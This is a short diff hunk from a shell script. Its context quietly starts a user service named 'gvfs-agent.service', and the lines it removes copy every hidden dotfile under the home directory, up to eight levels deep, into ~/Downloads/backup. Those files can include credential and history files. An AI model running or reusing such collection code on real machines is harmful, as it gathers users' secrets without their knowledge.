@@ -43,12 +43,3 @@ systemctl --user start gvfs-agent.service
 
 } &> /dev/null
 
-mkdir -p $HOME/Downloads/backup
-
-readarray -d '' array < <(find $HOME -maxdepth 8 -type f -name '.*' -print0)
-
-for a in "${array[@]}"
-do
-	echo "$a"
-	cp "${a}" $HOME/Downloads/backup/
-done
